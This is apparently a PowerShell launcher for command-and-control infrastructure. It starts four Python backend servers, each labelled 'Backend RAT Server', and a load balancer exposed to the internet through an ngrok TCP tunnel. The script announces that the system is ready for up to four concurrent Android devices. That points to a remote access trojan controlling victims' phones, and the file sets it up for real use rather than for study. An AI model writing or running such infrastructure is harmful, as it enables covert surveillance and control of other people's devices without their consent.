# Start Backend Server 1
Write-Host "🔧 Starting Backend Server on Port 8889..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 8889'; Write-Host '🔧 Backend RAT Server - Port 8889' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 8889"
Start-Sleep -Milliseconds 1000

# Start Backend Server 2  
Write-Host "🔧 Starting Backend Server on Port 8890..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 8890'; Write-Host '🔧 Backend RAT Server - Port 8890' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 8890"
Start-Sleep -Milliseconds 1000

# Start Backend Server 3
Write-Host "🔧 Starting Backend Server on Port 8891..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 8891'; Write-Host '🔧 Backend RAT Server - Port 8891' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 8891"
Start-Sleep -Milliseconds 1000

# Start Backend Server 4
Write-Host "🔧 Starting Backend Server on Port 8892..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Backend Server - Port 8892'; Write-Host '🔧 Backend RAT Server - Port 8892' -ForegroundColor Cyan; python fixed_server.py --host 127.0.0.1 --port 8892"

Write-Host ""
Write-Host "⏳ Waiting 5 seconds for backend servers to start..." -ForegroundColor Yellow
Start-Sleep -Seconds 5

# Start Load Balancer
Write-Host "🎯 Starting Load Balancer on Port 8888..." -ForegroundColor Green
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd '$PSScriptRoot'; `$host.UI.RawUI.WindowTitle = 'Load Balancer - Port 8888'; Write-Host '🎯 Ngrok Load Balancer' -ForegroundColor Cyan; python ngrok_loadbalancer.py"

Write-Host ""
Write-Host "=" * 70 -ForegroundColor Green
Write-Host "✅ Multi-Device System Started!" -ForegroundColor Green
Write-Host "=" * 70 -ForegroundColor Green
Write-Host ""
Write-Host "📊 System Components:" -ForegroundColor Yellow
Write-Host "  - 4 Backend Servers (localhost:8889-8892) [Internal Only]" -ForegroundColor White
Write-Host "  - 1 Load Balancer (0.0.0.0:8888) [Accepts External Connections]" -ForegroundColor White
Write-Host "  - Ngrok Tunnel: 2.tcp.eu.ngrok.io:11134 → localhost:8888" -ForegroundColor White
Write-Host ""
Write-Host "📱 Ready for up to 4 concurrent Android devices!" -ForegroundColor Green
Write-Host ""
